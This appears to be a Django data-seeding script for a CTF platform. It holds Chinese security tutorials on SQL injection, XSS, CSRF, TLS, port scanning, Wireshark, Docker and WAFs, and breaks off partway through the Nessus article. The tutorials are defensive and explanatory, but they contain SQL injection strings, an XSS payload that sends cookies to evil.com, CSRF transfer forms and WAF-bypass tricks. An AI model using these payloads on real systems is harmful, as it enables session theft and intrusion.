#!/usr/bin/env python
"""
网络安全社区文章数据初始化脚本
生成20篇网络安全相关文章，每篇包含多个评论
"""

import os
import sys
import django

# 添加项目路径
sys.path.append('/workspace/projects/ctf-platform/backend')

# 设置Django环境
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'config.settings')
django.setup()

from articles.models import Article, Category, Comment
from users.models import User
from django.utils import timezone
import random


# 网络安全文章数据
ARTICLES_DATA = [
    {
        "title": "SQL注入攻击原理与防御",
        "category": "Web安全",
        "tags": "SQL注入,Web安全,渗透测试",
        "content": """# SQL注入攻击原理与防御

## 什么是SQL注入？

SQL注入（SQL Injection）是一种常见的Web安全漏洞，攻击者可以通过在应用程序的输入字段中插入恶意的SQL代码，来操纵后端数据库。

## SQL注入的危害

1. **数据泄露**：攻击者可以获取敏感数据
2. **数据篡改**：修改或删除数据库中的数据
3. **绕过认证**：绕过登录验证
4. **权限提升**：获取管理员权限
5. **服务器接管**：在某些情况下甚至可以控制整个服务器

## 常见的SQL注入类型

### 1. 经典的基于错误的注入

\`\`\`sql
-- 原始查询
SELECT * FROM users WHERE username = '$username'

-- 恶意输入
' OR '1'='1

-- 结果查询
SELECT * FROM users WHERE username = '' OR '1'='1'
\`\`\`

### 2. UNION注入

\`\`\`sql
' UNION SELECT username, password FROM users--
\`\`\`

### 3. 盲注

- **基于布尔**：通过页面响应变化判断
- **基于时间**：通过响应时间延迟判断

## 防御措施

### 1. 使用参数化查询

\`\`\`python
# 不安全的方式
query = f"SELECT * FROM users WHERE username = '{username}'"

# 安全的方式 - 使用参数化查询
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, [username])
\`\`\`

### 2. 使用ORM框架

\`\`\`python
# Django ORM
User.objects.filter(username=username)
\`\`\`

### 3. 输入验证

```python
import re

def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username
```

### 4. 最小权限原则

数据库用户只拥有必要的权限，不要使用root账户。

## 检测SQL注入的工具

- **SQLMap**：自动化SQL注入工具
- **Burp Suite**：Web应用安全测试
- **OWASP ZAP**：免费的安全扫描工具

## 总结

SQL注入虽然古老，但仍然是最常见和最危险的Web安全漏洞之一。通过使用参数化查询、输入验证和最小权限原则，可以有效防御SQL注入攻击。

记住：永远不要信任用户的输入！
""",
        "summary": "详细介绍SQL注入攻击的原理、常见类型和防御方法，包括参数化查询、输入验证等最佳实践。"
    },
    {
        "title": "XSS跨站脚本攻击全解析",
        "category": "Web安全",
        "tags": "XSS,跨站脚本,前端安全",
        "content": """# XSS跨站脚本攻击全解析

## 什么是XSS？

跨站脚本攻击（Cross-Site Scripting，XSS）是一种代码注入攻击，攻击者在网页中注入恶意脚本，当用户浏览网页时，恶意脚本会在用户浏览器中执行。

## XSS的三种类型

### 1. 反射型XSS（Reflected XSS）

恶意脚本通过URL参数反射到页面中：

```
https://example.com/search?q=<script>alert(1)</script>
```

### 2. 存储型XSS（Stored XSS）

恶意脚本被存储到数据库，所有访问该页面的用户都会执行：

```html
评论区：<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

### 3. DOM型XSS（DOM-based XSS）

恶意脚本在客户端通过DOM操作执行：

```javascript
var hash = location.hash;
document.getElementById('content').innerHTML = hash;
```

## XSS的危害

1. **Cookie窃取**：获取用户登录凭证
2. **会话劫持**：接管用户会话
3. **钓鱼攻击**：伪造登录页面
4. **键盘记录**：记录用户按键
5. **恶意软件传播**：下载恶意软件

## 防御措施

### 1. 输出编码

```html
<!-- HTML编码 -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- JavaScript编码 -->
\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E

<!-- URL编码 -->
%3Cscript%3Ealert(1)%3C/script%3E
```

### 2. 使用CSP（Content Security Policy）

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

### 3. 使用HttpOnly Cookie

```python
response.set_cookie('sessionid', session_id, httponly=True)
```

### 4. 前端框架的自动转义

```vue
<!-- Vue自动转义 -->
<div>{{ userInput }}</div>

<!-- 需要渲染HTML时使用v-html（谨慎使用）-->
<div v-html="trustedContent"></div>
```

## 检测XSS

- **手动测试**：在输入框中注入测试脚本
- **自动化工具**：XSStrike、Burp Suite
- **浏览器插件**：DOM XSS Scanner

## 总结

XSS攻击简单但危害巨大，防御XSS需要：
- 对所有用户输入进行适当的编码
- 实施CSP策略
- 使用HttpOnly Cookie
- 保持框架和库的最新版本
""",
        "summary": "全面解析XSS攻击的三种类型、危害及防御策略，包括输入编码、CSP配置等安全实践。"
    },
    {
        "title": "CSRF攻击与防护机制",
        "category": "Web安全",
        "tags": "CSRF,跨站请求伪造,安全防护",
        "content": """# CSRF攻击与防护机制

## 什么是CSRF？

跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种攻击方式，攻击者诱导用户在已登录的目标网站上执行非本意的操作。

## CSRF攻击原理

1. 用户登录银行网站A
2. 用户没有退出，点击了恶意网站B
3. 网站B向网站A发送请求
4. 由于浏览器自动携带Cookie，网站A认为这是用户的操作

```
用户已登录银行 → 访问恶意网站 → 恶意网站向银行发送转账请求 → 银行执行转账
```

## CSRF攻击示例

```html
<!-- 恶意网站 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

或者：

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
  <script>document.forms[0].submit();</script>
</form>
```

## 防御措施

### 1. CSRF Token

在表单中添加随机生成的token：

```python
# Django自动提供CSRF保护
<form method="post">
  {% csrf_token %}
  <input type="submit" value="Submit">
</form>
```

### 2. SameSite Cookie属性

```python
response.set_cookie('sessionid', session_id, samesite='Strict')
# 或
response.set_cookie('sessionid', session_id, samesite='Lax')
```

### 3. 验证Referer/Origin

```python
def transfer_view(request):
    referer = request.META.get('HTTP_REFERER')
    if not referer or not referer.startswith('https://bank.com'):
        raise PermissionDenied
```

### 4. 二次确认

对于重要操作，要求用户再次确认：

```javascript
if (confirm('确定要转账10000元吗？')) {
  submitTransfer();
}
```

### 5. 使用自定义请求头

```javascript
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest'
  },
  body: JSON.stringify(data)
})
```

## CSRF vs XSS

| 特征 | CSRF | XSS |
|------|------|-----|
| 攻击目标 | 服务器 | 客户端 |
| 执行位置 | 服务器 | 浏览器 |
| 是否需要用户登录 | 是 | 否 |
| 防御重点 | 服务器验证 | 输入过滤 |

## 检测CSRF

- 检查敏感操作是否有CSRF Token
- 使用Burp Suite的CSRF检测插件
- 手动测试Referer验证

## 总结

CSRF攻击利用用户的登录状态执行恶意操作，有效的防御需要：
- 实施CSRF Token
- 配置SameSite Cookie
- 验证Referer/Origin
- 重要操作二次确认
""",
        "summary": "深入讲解CSRF攻击原理、示例和防御策略，包括CSRF Token、SameSite Cookie等多种防护机制。"
    },
    {
        "title": "密码安全最佳实践",
        "category": "Web安全",
        "tags": "密码安全,哈希,身份认证",
        "content": """# 密码安全最佳实践

## 为什么密码安全很重要？

密码是用户账户的第一道防线，密码泄露可能导致：
- 账户被盗
- 身份冒用
- 数据泄露
- 隐私暴露

## 常见的密码安全问题

1. **弱密码**：123456、password、qwerty等
2. **密码复用**：多个账户使用相同密码
3. **明文存储**：数据库中存储明文密码
4. **简单哈希**：使用MD5、SHA1等快速哈希算法

## 安全的密码存储

### 使用强哈希算法

```python
import bcrypt

# 生成密码哈希
password = "my_secure_password"
salt = bcrypt.gensalt()
hashed_password = bcrypt.hashpw(password.encode('utf-8'), salt)

# 验证密码
if bcrypt.checkpw(password.encode('utf-8'), hashed_password):
    print("密码正确")
```

### Argon2算法

```python
from argon2 import PasswordHasher

ph = PasswordHasher()
hashed = ph.hash("my_password")
ph.verify(hashed, "my_password")
```

### PBKDF2

```python
import hashlib
import binascii
import os

def hash_password(password, salt=None):
    if salt is None:
        salt = binascii.hexlify(os.urandom(32))
    iterations = 100000
    dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, iterations)
    return binascii.hexlify(salt) + binascii.hexlify(dk)
```

## 密码策略

### 1. 密码复杂度要求

- 最少8个字符
- 包含大小写字母
- 包含数字
- 包含特殊字符

```python
import re

def validate_password(password):
    if len(password) < 8:
        return False
    if not re.search(r'[A-Z]', password):
        return False
    if not re.search(r'[a-z]', password):
        return False
    if not re.search(r'[0-9]', password):
        return False
    if not re.search(r'[!@#$%^&*]', password):
        return False
    return True
```

### 2. 密码历史

禁止用户重复使用最近的N个密码。

### 3. 密码过期

定期要求用户修改密码（注意：不要太频繁）

## 双因素认证（2FA）

即使密码泄露，2FA也能保护账户：

```python
import pyotp

# 生成秘钥
secret = pyotp.random_base32()
totp = pyotp.TOTP(secret)

# 生成验证码
current_code = totp.now()

# 验证验证码
if totp.verify(user_input_code):
    print("验证成功")
```

## 常见攻击和防御

### 1. 暴力破解

**防御**：
- 限制尝试次数
- 使用验证码
- 账户锁定

### 2. 彩虹表攻击

**防御**：
- 使用Salt
- 增加哈希迭代次数

### 3. 凭证填充（Credential Stuffing）

**防御**：
- 检测异常登录
- 通知用户异常活动

## 用户教育

1. 不要重复使用密码
2. 使用密码管理器
3. 启用双因素认证
4. 不要在多个重要账户使用相同密码
5. 定期检查已泄露的密码（使用Have I Been Pwned）

## 总结

密码安全需要多层防护：
- 使用强哈希算法存储密码
- 实施密码复杂度策略
- 启用双因素认证
- 监控异常登录行为
- 教育用户良好的密码习惯
""",
        "summary": "全面的密码安全指南，包括密码存储、哈希算法、双因素认证和防御常见攻击的最佳实践。"
    },
    {
        "title": "HTTPS与TLS加密详解",
        "category": "网络安全",
        "tags": "HTTPS,TLS,SSL,加密",
        "content": """# HTTPS与TLS加密详解

## 什么是HTTPS？

HTTPS（Hyper Text Transfer Protocol Secure）是HTTP的安全版本，通过TLS/SSL协议加密数据传输。

## 为什么需要HTTPS？

### HTTP的问题

1. **明文传输**：所有数据都可以被拦截
2. **中间人攻击**：攻击者可以篡改数据
3. **数据泄露**：敏感信息暴露
4. **无法验证身份**：无法确认网站真实性

### HTTPS的优势

1. **数据加密**：防止数据被窃取
2. **数据完整性**：防止数据被篡改
3. **身份验证**：确认网站身份
4. **SEO友好**：搜索引擎优先展示HTTPS网站

## TLS/SSL握手过程

### 1. 客户端Hello

客户端发送：
- 支持的TLS版本
- 支持的加密套件
- 随机数（Client Random）

### 2. 服务器Hello

服务器返回：
- 选择的TLS版本
- 选择的加密套件
- 随机数（Server Random）
- 数字证书

### 3. 验证证书

客户端验证：
- 证书是否可信
- 证书是否过期
- 证书域名是否匹配

### 4. 密钥交换

使用非对称加密交换对称密钥。

### 5. 加密通信

使用对称密钥加密数据传输。

## SSL/TLS版本演进

| 版本 | 状态 | 发布时间 |
|------|------|---------|
| SSL 2.0 | 已废弃 | 1995 |
| SSL 3.0 | 已废弃 | 1996 |
| TLS 1.0 | 已废弃 | 1999 |
| TLS 1.1 | 已废弃 | 2006 |
| TLS 1.2 | 推荐 | 2008 |
| TLS 1.3 | 推荐 | 2018 |

## 获取SSL证书

### 1. Let's Encrypt（免费）

```bash
# 使用Certbot
sudo certbot --nginx -d example.com
```

### 2. 付费证书

- DigiCert
- Comodo
- GlobalSign

## Nginx配置HTTPS

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    # 推荐配置
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;

    # HSTS
    add_header Strict-Transport-Security "max-age=31536000" always;
}

# HTTP重定向到HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}
```

## Django配置HTTPS

```python
# settings.py
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
```

## 安全最佳实践

1. **使用TLS 1.2或更高版本**
2. **启用HSTS**
3. **使用强加密套件**
4. **定期更新证书**
5. **监控证书过期时间**
6. **禁用弱加密算法**
7. **使用OCSP Stapling**

## 常见问题

### Q: HTTPS会降低性能吗？

A: 现代TLS 1.3和HTTP/2已经大大优化了性能，性能影响可以忽略。

### Q: 可以自签名证书吗？

A: 仅用于开发环境，生产环境必须使用受信任的CA签发的证书。

### Q: 如何检查证书是否安全？

A: 使用SSL Labs的SSL Test工具。

## 总结

HTTPS是现代Web应用的标准配置，它提供：
- 数据加密
- 数据完整性
- 身份验证

使用Let's Encrypt等免费证书，让每个网站都能享受HTTPS的保护！
""",
        "summary": "详细解释HTTPS和TLS的工作原理、握手过程、配置方法和安全最佳实践，包括免费证书获取。"
    },
    {
        "title": "端口扫描与发现技术",
        "category": "网络扫描",
        "tags": "端口扫描,Nmap,侦察",
        "content": """# 端口扫描与发现技术

## 什么是端口扫描？

端口扫描是网络安全侦察的重要手段，通过扫描目标主机的端口，发现开放的服务和潜在的漏洞。

## 常见的端口扫描技术

### 1. TCP Connect扫描

```bash
nmap -sT target.com
```

- 建立完整的TCP连接
- 易于被防火墙检测
- 速度快

### 2. TCP SYN扫描（半开放扫描）

```bash
nmap -sS target.com
```

- 只发送SYN包
- 不完成三次握手
- 较难被检测
- 需要root权限

### 3. UDP扫描

```bash
nmap -sU target.com
```

- 扫描UDP端口
- 速度较慢
- 容易超时

### 4. FIN扫描

```bash
nmap -sF target.com
```

- 发送FIN包
- 绕过某些防火墙
- 可能有误报

### 5. NULL扫描

```bash
nmap -sN target.com
```

- 所有标志位都为0
- 绕过某些IDS

### 6. XMAS扫描

```bash
nmap -sX target.com
```

- FIN、PSH、URG标志位为1
- 类似FIN扫描

## 常用扫描工具

### Nmap

```bash
# 基本扫描
nmap target.com

# 指定端口范围
nmap -p 1-1000 target.com

# 服务版本检测
nmap -sV target.com

# 操作系统检测
nmap -O target.com

# 脚本扫描
nmap --script vuln target.com

# 快速扫描（前100个端口）
nmap -F target.com

# 激进扫描
nmap -A target.com
```

### Masscan

```bash
# 超快端口扫描
masscan -p80,443,8000-9000 192.168.1.0/24 --rate 10000
```

### Unicornscan

```bash
unicornscan -mT -p 80,443 192.168.1.1-100
```

## 常见服务端口

| 端口 | 服务 | 协议 |
|------|------|------|
| 21 | FTP | TCP |
| 22 | SSH | TCP |
| 23 | Telnet | TCP |
| 25 | SMTP | TCP |
| 53 | DNS | TCP/UDP |
| 80 | HTTP | TCP |
| 110 | POP3 | TCP |
| 135 | RPC | TCP |
| 139 | NetBIOS | TCP |
| 143 | IMAP | TCP |
| 443 | HTTPS | TCP |
| 445 | SMB | TCP |
| 3306 | MySQL | TCP |
| 3389 | RDP | TCP |
| 5432 | PostgreSQL | TCP |
| 6379 | Redis | TCP |
| 8080 | HTTP代理 | TCP |

## 防御端口扫描

### 1. 使用防火墙

```bash
# UFW（Ubuntu）
sudo ufw enable
sudo ufw deny 22/tcp  # 限制SSH
sudo ufw allow from 192.168.1.100 to any port 22

# iptables
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
```

### 2. 端口敲门（Port Knocking）

隐藏服务端口，只有按顺序访问特定端口才会开放服务。

### 3. 端口重定向

将常见端口映射到非标准端口。

### 4. 监控和告警

```bash
# 使用fail2ban
sudo apt-get install fail2ban
```

## 扫描检测

### 1. 检测异常的连接模式

- 大量来自同一IP的连接
- 短时间内的端口探测

### 2. 使用IDS/IPS

- Snort
- Suricata
- Zeek

### 3. 日志分析

```bash
# 分析Nginx访问日志
tail -f /var/log/nginx/access.log | grep "GET"
```

## 法律和伦理

⚠️ **重要提示**：
- 端口扫描可能违法
- 只扫描自己拥有授权的系统
- 遵守当地法律法规
- 遵循道德黑客准则

## 总结

端口扫描是网络安全的重要侦察手段：
- 了解目标系统的开放服务
- 发现潜在的安全漏洞
- 制定后续的攻击策略

但同时也需要注意：
- 遵守法律和道德规范
- 采取防御措施
- 监控异常扫描行为
""",
        "summary": "全面介绍端口扫描的各种技术、常用工具（Nmap、Masscan）、常见服务端口和防御措施。"
    },
    {
        "title": "Wireshark网络抓包分析实战",
        "category": "网络安全",
        "tags": "Wireshark,抓包,网络分析",
        "content": """# Wireshark网络抓包分析实战

## 什么是Wireshark？

Wireshark是一个开源的网络协议分析工具，可以捕获和分析网络流量，是网络安全专家必备的工具。

## Wireshark基本使用

### 1. 选择网络接口

启动Wireshark后，选择要监控的网络接口：
- eth0：以太网接口
- wlan0：无线网络接口
- lo：回环接口

### 2. 开始抓包

点击"开始捕获分组"按钮（鲨鱼图标）开始抓包。

### 3. 停止抓包

点击红色方块按钮停止抓包。

## 抓包过滤器

### 显示过滤器（Display Filter）

```
# 过滤特定IP
ip.addr == 192.168.1.1

# 过滤特定端口
tcp.port == 80

# 过滤HTTP请求
http.request.method == "GET"

# 过滤特定域名
http.host == "example.com"

# 组合过滤
ip.addr == 192.168.1.1 and tcp.port == 80
```

### 捕获过滤器（Capture Filter）

```
# 只捕获特定主机的流量
host 192.168.1.1

# 只捕获特定端口
port 80

# 捕获HTTP流量
port 80 or port 443

# 捕获TCP流量
tcp
```

## 常用分析场景

### 1. 分析HTTP流量

```
过滤器：http
```

可以查看：
- 请求方法（GET、POST）
- URL
- 请求头
- Cookie
- 响应状态

### 2. 分析HTTPS流量

HTTPS是加密的，但可以看到：
- 客户端Hello
- 服务器Hello
- 证书信息
- 加密套件

```
过滤器：tls
```

### 3. 分析DNS查询

```
过滤器：dns
```

可以查看：
- 查询的域名
- DNS响应
- DNS服务器

### 4. 分析TCP连接

```
过滤器：tcp
```

查看三次握手：
- SYN
- SYN-ACK
- ACK

### 5. 分析ICMP流量

```
过滤器：icmp
```

用于网络诊断：
- ping请求/响应
- 路由不可达
- 超时

## 实战案例

### 案例1：发现网络攻击

```
# 检测端口扫描
tcp.flags.syn == 1 and tcp.flags.ack == 0

# 检测异常流量
tcp.stream eq 0
```

### 案例2：分析慢速网络问题

```
# 查看TCP重传
tcp.analysis.retransmission

# 查看丢包
tcp.analysis.lost_segment
```

### 案例3：提取文件

```
# 导出HTTP对象
文件 → 导出对象 → HTTP

# 提取特定数据流
右键 → 追踪流 → TCP流
```

### 案例4：查找恶意软件通信

```
# 查找可疑连接
http.request.uri contains ".exe"

# 查找DNS隧道
dns.qry.name.len > 50
```

## Wireshark技巧

### 1. 着色规则

- 红色：错误
- 深蓝色：TCP流量
- 浅蓝色：UDP流量
- 黑色：ARP

### 2. 统计功能

```
# 协议层次统计
统计 → 协议层次

# 端点统计
统计 → 端点

# 对话统计
统计 → 对话
```

### 3. 专家信息

```
分析 → 专家信息
```

显示可能的问题和警告。

### 4. 流图

```
统计 → 流图 → TCP流图
```

可视化TCP连接过程。

## 安全注意事项

1. **权限**：抓包需要管理员/root权限
2. **隐私**：不要在公共网络抓包他人流量
3. **加密**：HTTPS流量只能看到加密后的数据
4. **存储**：抓包文件可能包含敏感信息，妥善保管

## 命令行替代工具

### tcpdump

```bash
# 抓取100个包
tcpdump -c 100

# 抓取特定端口
tcpdump port 80

# 保存到文件
tcpdump -w capture.pcap

# 读取文件
tcpdump -r capture.pcap
```

### tshark（Wireshark命令行）

```bash
# 列出接口
tshark -D

# 抓包
tshark -i eth0

# 应用过滤器
tshark -i eth0 -f "port 80"
```

## 学习资源

- Wireshark官方文档
- Wireshark Wiki
- Wireshark University
- 官方教程：https://wiki.wireshark.org/SampleCaptures

## 总结

Wireshark是强大的网络分析工具：
- 捕获网络流量
- 分析协议细节
- 排查网络问题
- 发现安全威胁

掌握Wireshark，让你对网络了如指掌！
""",
        "summary": "详细介绍Wireshark的使用方法、抓包过滤器、常见分析场景和实战案例，包括HTTP、HTTPS、DNS等协议分析。"
    },
    {
        "title": "Docker容器安全实践",
        "category": "DevSecOps",
        "tags": "Docker,容器安全,DevSecOps",
        "content": """# Docker容器安全实践

## 为什么容器安全很重要？

容器安全的重要性日益增加，因为：
- 容器被广泛用于生产环境
- 容器逃逸可能导致主机被入侵
- 容器镜像可能包含漏洞
- 容器网络配置不当

## Docker安全威胁

### 1. 容器逃逸

容器逃逸是指攻击者突破容器边界，访问宿主机。

常见逃逸方式：
- 特权容器
- 挂载敏感目录
- 内核漏洞

### 2. 镜像漏洞

- 包含已知漏洞的软件包
- 恶意镜像
- 泄露的密钥

### 3. 不安全的配置

- 暴露过多端口
- 使用root用户运行
- 弱认证机制

## Docker安全最佳实践

### 1. 使用最小化镜像

```dockerfile
# 不推荐：使用完整操作系统
FROM ubuntu:latest

# 推荐：使用Alpine Linux
FROM alpine:latest

# 或使用多阶段构建
FROM node:14 AS builder
WORKDIR /app
COPY . .
RUN npm install && npm run build

FROM node:14-alpine
WORKDIR /app
COPY --from=builder /app/dist ./dist
CMD ["node", "server.js"]
```

### 2. 不要使用root用户

```dockerfile
# 创建非root用户
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001

# 切换用户
USER nodejs
```

### 3. 镜像扫描

```bash
# 使用Trivy扫描镜像
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy image myapp:latest

# 使用Clair
clairctl analyze myapp:latest
```

### 4. 限制容器权限

```yaml
# docker-compose.yml
version: '3'
services:
  app:
    image: myapp:latest
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    read_only: true
    tmpfs:
      - /tmp
```

### 5. 使用只读文件系统

```bash
docker run --read-only --tmpfs /tmp myapp:latest
```

### 6. 网络隔离

```bash
# 创建独立网络
docker network create app-network

# 连接到网络
docker run --network app-network myapp:latest
```

### 7. 资源限制

```bash
docker run \
  --cpus="1.5" \
  --memory="512m" \
  --memory-swap="1g" \
  myapp:latest
```

### 8. 不要在镜像中存储密钥

```dockerfile
# ❌ 不推荐
RUN echo "API_KEY=${API_KEY}" >> .env

# ✅ 推荐
ENV API_KEY=${API_KEY}

# 使用Secrets
docker run -e API_KEY=${API_KEY} myapp:latest
```

### 9. 使用Docker Bench

```bash
# 运行安全检查
docker run --rm --net host --pid host --userns host \
  --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib/docker:/var/lib/docker:ro \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --label docker_bench_security \
  docker/docker-bench-security
```

### 10. 定期更新镜像

```bash
# 检查可用的更新
docker images

# 重新构建镜像
docker build -t myapp:latest .
```

## 容器运行时安全

### 1. Kubernetes Pod Security

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL
```

### 2. 使用安全策略

```yaml
# Pod Security Policy
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
```

## 监控和审计

### 1. 容器日志

```bash
# 查看容器日志
docker logs container_id

# 实时查看
docker logs -f container_id
```

### 2. 容器监控

使用Prometheus + Grafana监控容器：
- CPU使用率
- 内存使用量
- 网络流量
- 磁盘IO

### 3. 安全事件监控

- Falco：运行时安全监控
- Sysdig：容器安全平台
- Aqua Security：容器安全解决方案

## 学习资源

- Docker官方安全指南
- CIS Docker Benchmark
- OWASP Docker Top 10
- Kubernetes安全最佳实践

## 总结

Docker容器安全需要多层防护：
- 使用最小化镜像
- 限制容器权限
- 定期扫描镜像
- 实施网络隔离
- 监控和审计
- 及时更新补丁

安全从开发阶段开始，贯穿整个容器生命周期！
""",
        "summary": "全面的Docker容器安全指南，包括镜像安全、运行时安全、安全配置和监控审计的最佳实践。"
    },
    {
        "title": "Web应用防火墙（WAF）原理与实践",
        "category": "网络安全",
        "tags": "WAF,Web安全,防火墙",
        "content": """# Web应用防火墙（WAF）原理与实践

## 什么是WAF？

Web应用防火墙（Web Application Firewall）是一种保护Web应用程序的安全设备或软件，用于过滤和监控Web流量。

## WAF的作用

1. **防护常见攻击**
   - SQL注入
   - XSS
   - CSRF
   - 命令注入
   - 文件包含

2. **访问控制**
   - IP白名单/黑名单
   - 地理位置限制
   - 访问频率限制

3. **数据泄露防护**
   - 敏感信息过滤
   - 信用卡信息保护
   - 个人信息保护

4. **安全监控**
   - 实时日志记录
   - 攻击告警
   - 流量分析

## WAF工作原理

### 1. 流量检测

```
用户请求 → WAF检测 → 安全 → 后端服务器
                   ↓
                 恶意 → 拦截/报警
```

### 2. 规则匹配

WAF使用规则库检测恶意流量：

```nginx
# ModSecurity规则示例
SecRule REQUEST_URI "@rx union select" "id:1001,phase:2,deny,msg:'SQL Injection Attempt'"
```

### 3. 行为分析

分析用户行为模式，识别异常：
- 访问频率异常
- 请求模式异常
- User-Agent异常

## WAF部署模式

### 1. 反向代理模式

```
Internet → WAF → Web服务器
```

- 简单部署
- 性能影响小
- 可保护整个站点

### 2. 嵌入式模式

WAF直接集成在Web服务器中。

### 3. 云端WAF

```
Internet → 云端WAF → Web服务器
```

- 无需硬件
- 自动更新
- 按需付费

## 开源WAF方案

### 1. ModSecurity

最流行的开源WAF：

```nginx
# Nginx + ModSecurity
load_module modules/ngx_http_modsecurity_module.so;

server {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}
```

### 2. Naxsi

Nginx WAF模块：

```nginx
server {
    SecRuleEngine On;
    LearningMode On;
    
    location / {
        ModSecurityEnabled on;
        ModSecurityConfig /etc/naxsi/naxsi_core.rules;
    }
}
```

### 3. OWASP CRS

OWASP核心规则集：

```bash
# 安装OWASP CRS
git clone https://github.com/coreruleset/coreruleset.git
cp -r coreruleset /etc/nginx/owasp-modsecurity-crs/
```

## 商业WAF方案

### 1. Cloudflare WAF

- 全球CDN
- 免费版可用
- 简单配置

### 2. AWS WAF

- 与AWS集成
- 管理规则
- 成本较低

### 3. 阿里云WAF

- 国内节点多
- 中文支持
- DDoS防护

## WAF配置示例

### ModSecurity配置

```nginx
# 启用ModSecurity
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess Off

# 日志配置
SecAuditEngine On
SecAuditLog /var/log/modsecurity/audit.log

# 加载OWASP CRS
Include /etc/nginx/owasp-modsecurity-crs/crs-setup.conf
Include /etc/nginx/owasp-modsecurity-crs/rules/*.conf
```

### 自定义规则

```nginx
# 防护SQL注入
SecRule ARGS "@rx (?i:union.*select)" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection'"

# 防护XSS
SecRule ARGS "@rx <script" \
    "id:1002,phase:2,deny,status:403,msg:'XSS Attack'"

# 限制请求大小
SecRule REQUEST_BODY "@gt 10485760" \
    "id:1003,phase:1,deny,status:413,msg:'Request too large'"
```

## WAF最佳实践

### 1. 分阶段部署

```
学习模式 → 警告模式 → 阻断模式
```

### 2. 定期更新规则

```bash
# 更新OWASP CRS
cd /etc/nginx/owasp-modsecurity-crs
git pull origin master
```

### 3. 监控和调优

- 分析误报
- 调整规则
- 优化性能

### 4. 日志分析

```bash
# 分析ModSecurity日志
tail -f /var/log/modsecurity/audit.log
```

### 5. 定期测试

使用工具测试WAF：
- OWASP ZAP
- Burp Suite
- WAF测试工具

## WAF与IPS的区别

| 特征 | WAF | IPS |
|------|-----|-----|
| 保护对象 | Web应用 | 整个网络 |
| 检测层级 | 应用层（7层） | 网络/传输层 |
| 部署位置 | Web服务器前端 | 网络边界 |
| 防护重点 | Web攻击 | 网络攻击 |

## 常见WAF绕过技术

### 1. 编码绕过

```
# URL编码
%3Cscript%3E

# Unicode编码
\\u003Cscript\\u003E
```

### 2. 混淆绕过

```
# 大小写混淆
<ScRiPt>alert(1)</sCrIpT>

# 注释混淆
<scr<!--x-->ipt>alert(1)</sc<!--x-->ript>
```

### 3. 分块传输

将请求分成多个块发送。

## 防御绕过

- 规则引擎更新
- 行为分析
- AI/ML检测
- 沙箱技术

## 总结

WAF是Web安全的重要防线：
- 防护常见Web攻击
- 提供访问控制
- 监控安全事件
- 遵守合规要求

但WAF不是万能的，需要：
- 定期更新规则
- 监控误报
- 与其他安全措施配合
- 持续改进和优化
""",
        "summary": "深入讲解WAF的工作原理、部署模式、开源和商业方案、配置方法和最佳实践。"
    },
    {
        "title": "常见漏洞扫描工具使用指南",
        "category": "网络安全",
        "tags": "漏洞扫描,Nessus,OpenVAS",
        "content": """# 常见漏洞扫描工具使用指南

## 什么是漏洞扫描？

漏洞扫描是自动化检测系统和应用程序中安全漏洞的过程，是安全评估的重要环节。

## 漏洞扫描工具分类

### 1. 主机漏洞扫描器
- Nessus
- OpenVAS
- Nexpose

### 2. Web应用扫描器
- OWASP ZAP
- Burp Suite
- Arachni

### 3. 网络扫描器
- Nmap
- Masscan
- Nessus

## 主机漏洞扫描器

### Nessus

#### 安装

```bash
# 下载Nessus
wget https://www.tenable.com/downloads/nessus

# 安装
dpkg -i Nessus-8.13.1-ubuntu1404_amd64.deb

# 启动服务
service nessusd start

# 访问Web界面
https://localhost:8834
```

#### 使用步骤

